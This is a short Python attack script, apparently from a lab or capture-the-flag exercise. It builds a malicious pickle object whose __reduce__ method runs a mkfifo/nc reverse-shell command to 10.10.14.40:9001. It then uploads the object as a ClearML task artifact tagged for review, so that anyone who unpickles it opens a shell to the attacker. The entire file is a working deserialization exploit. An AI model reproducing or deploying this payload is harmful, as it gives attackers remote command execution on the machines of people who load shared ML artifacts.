#!/usr/bin/env python3
import os
import pickle
from clearml import Task
class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.40 9001 >/tmp/f',))
command = RunCommand()
task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=['review'], output_uri=True)
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True)
